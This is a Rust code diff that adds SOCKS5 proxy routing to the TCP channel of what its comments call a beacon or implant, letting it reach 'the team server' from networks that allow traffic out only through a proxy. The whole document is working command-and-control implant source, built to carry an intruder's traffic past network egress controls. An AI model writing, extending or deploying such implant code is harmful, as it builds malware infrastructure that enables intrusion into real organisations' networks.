@@ -46,15 +46,29 @@ const IO_TIMEOUT: Duration = Duration::from_secs(60);
 
 pub struct TcpChannel {
     addr: String,
+    proxy: String,
     stream: Option<TcpStream>,
 }
 
 impl TcpChannel {
     pub fn new(addr: &str) -> Self {
-        TcpChannel { addr: addr.to_string(), stream: None }
+        TcpChannel { addr: addr.to_string(), proxy: String::new(), stream: None }
+    }
+
+    /// Route the connection through a SOCKS5 proxy.
+    ///
+    /// A beacon in a network that only lets a proxy out uses this: the
+    /// implant speaks to the proxy, and the proxy carries the traffic to
+    /// the team server.
+    pub fn with_proxy(mut self, proxy: &str) -> Self {
+        self.proxy = proxy.trim().to_string();
+        self
     }
 
     pub fn connect(&mut self) -> io::Result<()> {
+        if !self.proxy.is_empty() {
+            return self.connect_via_proxy();
+        }
         let mut last: Option<io::Error> = None;
         for sa in self.addr.to_socket_addrs()? {
             match TcpStream::connect_timeout(&sa, CONNECT_TIMEOUT) {
@@ -69,6 +83,110 @@ impl TcpChannel {
             }
         }
         Err(last.unwrap_or_else(|| io::Error::new(io::ErrorKind::AddrNotAvailable, "no address")))
+    }
+
+    /// Connect to the proxy and let it carry the traffic to the server.
+    fn connect_via_proxy(&mut self) -> io::Result<()> {
+        let mut last: Option<io::Error> = None;
+        for sa in self.proxy.to_socket_addrs()? {
+            match TcpStream::connect_timeout(&sa, CONNECT_TIMEOUT) {
+                Ok(mut s) => {
+                    s.set_read_timeout(Some(IO_TIMEOUT))?;
+                    s.set_write_timeout(Some(IO_TIMEOUT))?;
+                    s.set_nodelay(true)?;
+                    if let Err(e) = socks5_connect(&mut s, &self.addr) {
+                        last = Some(e);
+                        continue;
+                    }
+                    self.stream = Some(s);
+                    return Ok(());
+                }
+                Err(e) => last = Some(e),
+            }
+        }
+        Err(last.unwrap_or_else(|| {
+            io::Error::new(io::ErrorKind::AddrNotAvailable, "the proxy is unreachable")
+        }))
+    }
+}
+
+/// The SOCKS5 handshake: no authentication, then a CONNECT to the target.
+fn socks5_connect(stream: &mut TcpStream, target: &str) -> io::Result<()> {
+    // The greeting: version 5, one method, "no authentication".
+    stream.write_all(&[0x05, 0x01, 0x00])?;
+    stream.flush()?;
+    let mut reply = [0u8; 2];
+    stream.read_exact(&mut reply)?;
+    if reply[0] != 0x05 {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            "the proxy does not speak SOCKS5",
+        ));
+    }
+    if reply[1] != 0x00 {
+        return Err(io::Error::new(
+            io::ErrorKind::PermissionDenied,
+            "the proxy wants an authentication the implant does not have",
+        ));
+    }
+    // The request: CONNECT to the address of the team server.
+    let (host, port) = split_target(target);
+    let mut request: Vec<u8> = vec![0x05, 0x01, 0x00];
+    if let Ok(ip) = host.parse::<std::net::Ipv4Addr>() {
+        request.push(0x01);
+        request.extend_from_slice(&ip.octets());
+    } else if let Ok(ip) = host.parse::<std::net::Ipv6Addr>() {
+        request.push(0x04);
+        request.extend_from_slice(&ip.octets());
+    } else {
+        if host.len() > 255 {
+            return Err(io::Error::new(io::ErrorKind::InvalidInput, "the host is too long"));
+        }
+        request.push(0x03);
+        request.push(host.len() as u8);
+        request.extend_from_slice(host.as_bytes());
+    }
+    request.extend_from_slice(&port.to_be_bytes());
+    stream.write_all(&request)?;
+    stream.flush()?;
+
+    // The reply: the version, the status and the bound address.
+    let mut head = [0u8; 4];
+    stream.read_exact(&mut head)?;
+    if head[1] != 0x00 {
+        return Err(io::Error::new(
+            io::ErrorKind::ConnectionRefused,
+            format!("the proxy refused the connection ({})", head[1]),
+        ));
+    }
+    let rest = match head[3] {
+        0x01 => 4 + 2,
+        0x04 => 16 + 2,
+        0x03 => {
+            let mut len = [0u8; 1];
+            stream.read_exact(&mut len)?;
+            len[0] as usize + 2
+        }
+        _ => {
+            return Err(io::Error::new(
+                io::ErrorKind::InvalidData,
+                "the proxy sent a bad address",
+            ))
+        }
+    };
+    let mut tail = vec![0u8; rest];
+    stream.read_exact(&mut tail)?;
+    Ok(())
+}
+
+/// Split "host:port" into the host and the port.
+fn split_target(target: &str) -> (String, u16) {
+    match target.rsplit_once(':') {
+        Some((host, port)) => (
+            host.trim_matches(|c| c == '[' || c == ']').to_string(),
+            port.parse().unwrap_or(443),
+        ),
+        None => (target.to_string(), 443),
     }
 }
 
